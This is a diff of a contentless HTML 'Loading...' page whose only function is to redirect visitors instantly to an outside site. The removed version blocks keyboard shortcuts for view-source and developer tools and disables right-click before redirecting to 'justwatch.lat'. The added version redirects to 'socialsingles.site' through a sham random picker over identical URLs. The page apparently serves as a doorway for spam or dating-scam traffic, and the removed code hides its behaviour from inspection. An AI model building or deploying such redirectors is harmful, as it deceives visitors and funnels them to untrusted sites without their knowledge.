@@ -1,33 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Loading...</title>
+  <meta charset="UTF-8" />
 
-<script>
-// ====== BLOK VIEW SOURCE & INSPECT ======
-document.addEventListener("keydown", function(e) {
-    if (
-        e.key === "F12" ||
-        (e.ctrlKey && e.key.toLowerCase() === "u") ||
-        (e.ctrlKey && e.shiftKey && ["i","j","c"].includes(e.key.toLowerCase()))
-    ) {
-        e.preventDefault();
-        return false;
-    }
-});
+  <script>
+    // List of destination URLs
+    const links = [
+      "https://socialsingles.site",
+      "https://socialsingles.site",
+      "https://socialsingles.site"
+    ];
 
-document.addEventListener("contextmenu", function(e) {
-    e.preventDefault();
-});
+    // Random URL selector
+    const randomLink = links[Math.floor(Math.random() * links.length)];
 
-// ====== REDIRECT FAST ======
-(function(){
-    const target = "https://justwatch.lat/"; // LINK
-    window.location.replace(target);
-})();
-</script>
-
+    // Redirect function
+    window.location.replace(randomLink);
+  </script>
 </head>
 <body>
 </body>
